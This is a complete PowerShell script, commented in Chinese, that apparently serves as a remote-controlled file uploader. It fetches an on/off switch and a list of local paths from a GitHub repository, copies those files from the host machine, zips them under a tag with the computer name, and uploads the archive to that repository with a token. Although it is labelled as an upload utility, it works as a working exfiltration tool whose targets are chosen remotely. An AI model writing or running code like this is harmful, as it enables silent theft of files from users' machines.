# === console.ps1 上传脚本 ===

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$repo = "ertgyhujkfghj/2"
$token = $env:GH_TOKEN
if ([string]::IsNullOrEmpty($token)) {
    Write-Host "❌ GH_TOKEN 环境变量未设置，脚本终止。"
    exit 1
}

# 上传开关和路径配置URL
$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"

# 检查上传开关
try {
    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
    if ($enabled.Trim().ToLower() -ne "on") {
        Write-Host "🛑 上传开关未启用，脚本退出。"
        exit 0
    }
} catch {
    Write-Warning "❌ 无法读取上传开关：$($_.Exception.Message)"
    exit 1
}

# 读取路径列表
try {
    $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
} catch {
    Write-Warning "❌ 无法读取路径配置：$($_.Exception.Message)"
    exit 1
}

# 创建临时目录
$tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 拷贝文件及目录（不处理文件锁，直接复制）
foreach ($path in $uploadPaths) {
    if (-not (Test-Path $path)) {
        Write-Warning "⚠️ 路径不存在，跳过：$path"
        continue
    }
    $item = Get-Item $path -Force
    try {
        if ($item.PSIsContainer) {
            $dest = Join-Path $tempDir $item.Name
            Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "📁 已复制目录：$($item.FullName)"
        } else {
            $dest = Join-Path $tempDir $item.Name
            Copy-Item -Path $item.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
            Write-Host "📄 已复制文件：$($item.FullName)"
        }
    } catch {
        Write-Warning "⚠️ 无法复制：$($item.FullName)"
    }
}

# 压缩为 ZIP
Add-Type -AssemblyName System.IO.Compression.FileSystem
$computerName = $env:COMPUTERNAME
$tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$zipPath = "$env:TEMP\$tag.zip"
try {
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
} catch {
    Write-Warning "❌ 压缩失败：$($_.Exception.Message)"
    Remove-Item $tempDir -Recurse -Force
    exit 1
}

# 清理临时目录
Remove-Item $tempDir -Recurse -Force

# 上传 ZIP
$uploadUrl = "https://api.github.com/repos/$repo/releases"
$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "upload-script"
    Accept        = "application/vnd.github+json"
}

try {
    $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
        tag_name   = $tag
        name       = $tag
        draft      = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3)

    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$(Split-Path $zipPath -Leaf)"
    Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent"   = "upload-script"
    } -InFile $zipPath

    Write-Host "`n✅ 上传成功：$tag.zip"
} catch {
    Write-Warning "❌ 上传失败：$($_.Exception.Message)"
}

# 删除压缩包
Remove-Item $zipPath -Force
